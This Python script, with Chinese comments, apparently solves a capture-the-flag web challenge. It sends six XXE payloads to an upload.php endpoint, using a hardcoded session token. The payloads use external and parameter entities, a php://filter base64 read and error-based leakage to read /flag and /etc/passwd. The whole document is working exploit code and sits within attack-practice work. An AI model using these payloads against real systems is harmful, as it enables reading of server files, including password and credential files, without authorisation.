import requests

url = 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/upload.php'
cookies = {'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MDY3MTJ9.CqErZOY8Ac-MBNgnLOXKu8G1WJlUzOIcrIkpu9ji6gA'}

# 尝试通过错误信息泄露数据
# 方法：将读取的内容放在会导致解析错误的位置
error_payloads = [
    # 1. 将 flag 放在标签名中（如果有非字母字符会报错）
    """<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///flag">
    ]>
    <foo>&xxe;</foo>""",

    # 2. 将 flag 放在注释中
    """<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///flag">
    ]>
    <foo><!--&xxe;--></foo>""",

    # 3. 读取 /etc/passwd 看看有没有反应
    """<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>""",

    # 4. 参数实体攻击（需要在内部 DTD 中使用）
    """<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "file:///flag">
        %xxe;
    ]>
    <foo>test</foo>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
  %xxe;
]>
<root/>""",

    # 5. CDATA
    """<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///flag">
    ]>
    <foo><![CDATA[&xxe;]]></foo>""",
]

for i, payload in enumerate(error_payloads, 1):
    print(f"\n=== Payload {i} ===")
    print(payload[:150] + "..." if len(payload) > 150 else payload)

    headers = {'Content-Type': 'application/xml'}
    try:
        resp = requests.post(url, data=payload, headers=headers, cookies=cookies, timeout=5)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text}")

        # 检查响应长度（不同长度的响应可能意味着不同的错误）
        print(f"Response length: {len(resp.text)}")

    except Exception as e:
        print(f"Error: {e}")
